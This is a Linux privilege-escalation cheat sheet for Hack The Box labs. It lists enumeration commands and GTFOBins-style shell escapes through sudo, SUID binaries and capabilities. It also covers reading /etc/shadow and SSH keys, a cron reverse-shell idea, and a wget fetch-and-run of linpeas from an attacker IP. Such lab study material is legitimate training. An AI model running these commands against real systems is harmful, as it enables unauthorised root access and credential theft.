#htb #linux #priv #previlege-escalation   #guide #cheatsheet

## 🔍 1. Basic Enumeration
**Commands:**
```
id
whoami
groups
hostname
uname -a
lsb_release -a
cat /etc/issue
cat /etc/passwd | cut -d: -f1
cat /etc/group
env
echo $PATH
ps aux --forest
ss -tulpn
netstat -tulpn
```
**Goal:** Spot weak services, kernel version, usernames, PATH hijacking.

---

## 🛡 2. Sudo Privileges
**Check:**
```
sudo -l
```
**Examples:**
```
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo less /etc/shadow
sudo awk 'BEGIN {system("/bin/sh")}'
```
**Resource:** [GTFOBins](https://gtfobins.github.io)

---

## ⚙️ 3. SUID / SGID Binaries
**Find:**
```
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```
**Examples:**
```
find . -exec /bin/sh \; -quit
nmap --interactive → !sh
bash -p
```

---

## 🎯 4. Capabilities
**Check:**
```
getcap -r / 2>/dev/null
```
**Examples:**
```
/usr/bin/python3.8 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

/usr/bin/tar = cap_dac_read_search+ep
tar -cf /dev/null /etc/shadow -P -I /bin/sh
```

---

## ⏰ 5. Cron Jobs
**Check:**
```
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers
```
**Exploit:** Replace writable cron scripts with reverse shell  
**Monitor:** `./pspy64`

---

## 🔑 6. Password & Key Hunting
**Search:**
```
grep -Ri "password" /etc/ 2>/dev/null
grep -Ri "password" /home/* 2>/dev/null
```
**Check:**
```
cat /var/www/html/config.php
cat /etc/mysql/my.cnf
cat ~/.ssh/id_rsa
cat ~/.bash_history
cat /etc/shadow   # crack with john/hashcat
```

---

## 🗃 7. Writable Files & PATH Hijacking
**Writable:**
```
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
```
**PATH Hijack:**
```
echo $PATH
```
If script calls `service` → place malicious `service` in PATH

---

## 🖥 8. Kernel Exploits
**Check:**
```
uname -r
```
**Examples:** DirtyCow, OverlayFS  
**Note:** Rare in HTB, but useful on outdated systems.

---

## 📦 9. Interesting Files
```
/etc/passwd
/etc/shadow
/etc/sudoers
/etc/crontab
/var/mail/
/var/log/
/opt/
/home/*/
```

---

## 🚀 10. Automation Helpers
**Tools:** `linpeas.sh`, `lse.sh`, `pspy`  
**Quick drop:**
```
wget http://<attacker_ip>/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

---

## 🧠 Workflow (HTB Labs)
1. Initial enum (`id`, `sudo -l`, `find suid`, `getcap`, `cron`)  
2. Take notes → possible attack vectors  
3. Manual attempts first  
4. Run `linpeas.sh`  
5. Cross-check with GTFOBins  
6. Exploit → root  
7. Document path for your playbook  
